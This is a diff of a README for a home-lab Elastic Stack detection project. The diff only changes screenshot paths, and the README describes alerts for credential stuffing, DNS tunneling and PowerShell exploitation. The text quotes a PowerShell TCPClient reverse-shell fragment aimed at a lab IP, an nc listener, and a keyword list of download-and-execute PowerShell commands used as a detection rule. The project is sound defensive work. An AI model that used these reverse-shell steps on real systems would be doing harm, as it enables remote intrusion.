@@ -39,17 +39,17 @@ A hands-on detection engineering project using the Elastic Stack to identify thr
 **A. Failed Login Logs in Kibana Discover**
 > Discover filtered by `event.outcome: failure` — parsed ECS fields (`source.ip`, `user.name`, `host.name`) confirming the auth log pipeline is working correctly.
 
-![Auth Failures Discover](screenshots/auth-failures-discover.png)
+![Auth Failures Discover](Screenshots/auth-failures-discover.png)
 
 **B. Raw auth.log — Volume of Failures**
 > auth.log showing rapid consecutive FAILURE entries from `172.30.80.1` — the raw input driving the detection pipeline.
 
-![Auth Failures](screenshots/auth-failures.png)
+![Auth Failures](Screenshots/auth-failures.png)
 
 **C. Threshold Alert Triggered**
 > `Credential Stuffing — Failed Logins from Single IP` alert — High severity, risk score 70, MITRE ATT&CK `TA0006 / T1110` mapped, source IP attributed.
 
-![Credential Threshold Alert](screenshots/credential-threshold-alert.png)
+![Credential Threshold Alert](Screenshots/credential-threshold-alert.png)
 
 ---
 
@@ -63,12 +63,12 @@ A hands-on detection engineering project using the Elastic Stack to identify thr
 **B. EQL Sequence Rule Configuration**
 > Rule definition showing `sequence by source.ip, user.name with maxspan=5m` — `failure` followed by `success` — targeting `logs-xampp-auth*` index.
 
-![EQL Rule Config](screenshots/rules-config-eql.png)
+![EQL Rule Config](Screenshots/rules-config-eql.png)
 
 **C. EQL Sequence Alert Triggered**
 > `Credential Stuffing — Failure Followed by Successful Login` — High severity, risk score 80, username `admin` on host `pavillion15` attributed. Confirms account compromise detection.
 
-![Credential EQL Alert](screenshots/credential-eql-alert.png)
+![Credential EQL Alert](Screenshots/credential-eql-alert.png)
 
 ---
 
@@ -77,22 +77,22 @@ A hands-on detection engineering project using the Elastic Stack to identify thr
 **A. Sequential Subdomain Query Pattern**
 > Windows CMD executing the `nslookup` loop — `data1.testlab.com`, `data2`, `data3`, `data4` queries in rapid succession. This high-frequency sequential subdomain pattern is characteristic of DNS tunneling.
 
-![DNS Pattern](screenshots/dns-pattern.png)
+![DNS Pattern](Screenshots/dns-pattern.png)
 
 **B. DNS Events in Kibana Discover**
 > Kibana Discover on `logs-network*` index — Packetbeat-captured DNS events with `dns.question.name`, `source.ip`, `destination.ip`, and `dns.response_code` fields populated.
 
-![DNS Discover](screenshots/dns-discover.png)
+![DNS Discover](Screenshots/dns-discover.png)
 
 **C. DNS Tunneling Rule Configuration**
 > Threshold rule — `≥50 DNS queries from single source.ip within 5 minutes` — targeting `logs-network*`. Behavioural detection, not domain-based.
 
-![DNS Rule Config](screenshots/rules-config-dns.png)
+![DNS Rule Config](Screenshots/rules-config-dns.png)
 
 **D. DNS Tunneling Alert Triggered**
 > `DNS Tunneling Detection` alert — High severity, risk score 73, source `192.168.1.2` attributed.
 
-![DNS Alert](screenshots/dns-alert.png)
+![DNS Alert](Screenshots/dns-alert.png)
 
 ---
 
@@ -101,22 +101,22 @@ A hands-on detection engineering project using the Elastic Stack to identify thr
 **A. Script Block Logging Events in Discover**
 > Kibana Discover showing PowerShell Script Block Logging (Event ID 4104) events — `Execute a Remote Command` action, `host: pavillion15`, `user: Noel Biju John`.
 
-![PowerShell Discover](screenshots/powershell-discover.png)
+![PowerShell Discover](Screenshots/powershell-discover.png)
 
 **B. TCPClient Script Block Captured (CRITICAL)**
 > Script block popup in Discover showing the exact `$client = New-Object System.Net.Sockets.TCPClient('172.30.89.150', 1234)` command captured at execution time — the evidence the rule fired on.
 
-![PowerShell Script Block](screenshots/powershell-scriptblock.png)
+![PowerShell Script Block](Screenshots/powershell-scriptblock.png)
 
 **C. PowerShell Rule Configuration**
 > KQL query rule targeting `powershell.file.script_block_text` for keywords: `TCPClient`, `DownloadString`, `IEX`, `Invoke-WebRequest`, `FromBase64String`, `EncodedCommand`, `ExecutionPolicy`, `Net.WebClient`.
 
-![PowerShell Rule Config](screenshots/powershell-rule-config.png)
+![PowerShell Rule Config](Screenshots/powershell-rule-config.png)
 
 **D. PowerShell Exploitation Alert Triggered**
 > `PowerShell Exploitation Detection` — High severity, risk score 70, process event attributed to user `Noel Biju John` on host `pavillion15`.
 
-![PowerShell Alert](screenshots/powershell-alert.png)
+![PowerShell Alert](Screenshots/powershell-alert.png)
 
 ---
 
@@ -125,7 +125,7 @@ A hands-on detection engineering project using the Elastic Stack to identify thr
 **A. Correlation Evidence: Script Execution + Network Activity**
 > Side-by-side: Kali Linux `nc -lvnp 1234` listener and Windows PowerShell executing `TCPClient('172.30.89.150', 1234)` — showing the attacker-side and victim-side simultaneously. The EQL rule correlates script block execution → outbound network connection within 30 seconds.
 
-![PowerShell Correlation](screenshots/powershell-correlation.png)
+![PowerShell Correlation](Screenshots/powershell-correlation.png)
 
 > ⚠️ **Note:** The `powershell_network_correlation.eql.ndjson` rule requires the Endpoint Security integration for `network` events from PowerShell. The Kibana Discover view above (screenshot 4B) shows both script block and network events from the same host in the same timeframe — confirming the correlation logic is sound even without a dedicated Endpoint agent alert.
 
